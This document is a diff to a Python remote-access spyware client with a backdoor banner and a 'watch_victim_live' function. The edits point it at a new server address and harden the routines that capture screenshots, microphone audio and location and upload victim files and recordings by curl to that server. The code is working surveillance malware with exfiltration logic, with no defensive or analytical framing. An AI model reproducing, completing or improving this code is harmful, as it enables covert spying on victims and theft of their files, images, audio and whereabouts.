@@ -13,10 +13,10 @@ from PIL import ImageGrab
 import threading
 from scipy.io.wavfile import write
 import sounddevice as sd
-SERVER_URL = "192.168.88.105:2020"
-WEBSOCKET_URL="ws://192.168.88.105:8765"
+SERVER_URL = "192.168.88.104:2020"
+WEBSOCKET_URL="ws://192.168.88.104:8765"
 PORT=12345
-IP_ADDRESS="192.168.88.105"
+IP_ADDRESS="192.168.88.104"
 banner = r"""
 ██████╗  █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ██████╗ ██████╗ 
 ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
@@ -102,8 +102,9 @@ def get_files(args):
         curl_cmd.extend(["-F", f"files=@{file_path}"])
     curl_cmd.append(f"{SERVER_URL}/upload")
     try:
-        result = subprocess.run( curl_cmd,capture_output=True)
+        result = subprocess.run(curl_cmd, capture_output=True)
         if result.returncode != 0:
+            print(result.stderr.decode())
             return False
         return True
     except:
@@ -119,8 +120,17 @@ def get_screenshot():
         "-F", "files=@-;filename=screenshot.png;type=image/png",
         f"{SERVER_URL}/upload"
     ]
-    subprocess.run(curl_command,input=buf.read(),capture_output=True)
-    return True
+    try:
+        result = subprocess.run(
+            curl_command,
+            input=buf.read(),
+            capture_output=True
+        )
+        if result.returncode != 0:
+            return False
+        return True
+    except:
+        return False
 def get_location():
     location = None
     try:
@@ -133,7 +143,7 @@ def get_location():
                 "source": "gps"
             }
     except:
-        pass 
+        pass
     if not location:
         g = geocoder.ip('me')
         if g.ok:
@@ -154,11 +164,11 @@ def get_location():
                 "-d", json_data,
                 f"{SERVER_URL}/get-location"
             ], capture_output=True, text=True)
-        except Exception as e:
+            return True
+        except:
             return False
-        return True
-    else:
-        return False
+
+    return False
 def record_and_send_audio(duration_seconds):
     sample_rate = 44100
     channels = 1
@@ -171,23 +181,24 @@ def record_and_send_audio(duration_seconds):
     sd.wait()
     buffer = io.BytesIO()
     write(buffer, sample_rate, recording)
-    audio_bytes = buffer.getvalue()
+    buffer.seek(0)
+    curl_command = [
+        "curl",
+        "-X", "POST",
+        "-F", "files=@-;filename=recording.wav;type=audio/wav",
+        f"{SERVER_URL}/upload"
+    ]
     try:
-        curl_command = [
-            "curl",
-            "-X", "POST",
-            f"{SERVER_URL}/upload",
-            "-F", "files=@-;filename=recording.wav;type=audio/wav"
-        ]
         result = subprocess.run(
             curl_command,
-            input=audio_bytes,   
+            input=buffer.read(),
             capture_output=True
         )
         if result.returncode != 0:
+            print(result.stderr.decode())
             return False
         return True
-    except Exception:
+    except:
         return False
 def watch_victim_live():
     try:
